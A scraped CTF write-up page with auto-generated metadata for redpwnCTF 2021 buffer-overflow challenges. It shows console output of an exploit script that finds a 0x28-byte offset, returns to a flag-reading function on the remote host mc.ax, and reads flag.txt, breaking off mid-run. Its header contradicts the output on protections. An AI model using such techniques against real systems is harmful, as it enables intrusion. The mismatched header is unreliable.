@@ -1,0 +1,15 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/29147
+CHALLENGE: CTFtime.org / redpwnCTF 2021 / beginner-generic-pwn-number-0 ...
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: NX, PIE, Canary, RELRO
+KEY_FUNCTIONS: gets, read
+KEY_TECHNIQUE: how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+---
+getsome.py BIN=./ret2generic-flag-reader HOST= mc.ax PORT=31077 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader': pid 312 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' stopped with exit code -11 (SIGSEGV) (pid 312) [!] Error parsing corefile stack: Found bad environment at 0x7fffe4f21f61 [+] Parsing corefile...: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/core.312' Arch:      amd64-64-little RIP:       0x40142f RSP:       0x7fffe4f20028 Exe:       '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' (0x400000) Fault:     0x6161616161616166 [*] padding: 0x28 [*] Loading gadgets for '/pwd/datajerk/redpwnctf2021/pwn/ret2generic-flag-reader/ret2generic-flag-reader' [+] Opening connection to mc.ax on port 31077: Done [*] Switching to interactive mode alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable... how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function! slap on some flavortext and there's no way rob will fire me now! this is genius!! what do you think? $ cat flag.txt flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage} ``` ```bash # ./ getsome.py BIN=./ret2the-unknown HOST= mc.ax PORT=31568 REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) [+] Starting local process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown': pid 361 [*] Process '/pwd/datajerk/redpwnctf2021/pwn/ret2the-unknown/ret2the-unknown' stopped with exit code
+
+[Additional Context: This page covers CTFtime.org / redpwnCTF 2021 / beginner-generic-pwn-number-0 ... in the context of binary exploitation and CTF challenges. Category: rop_chain.]
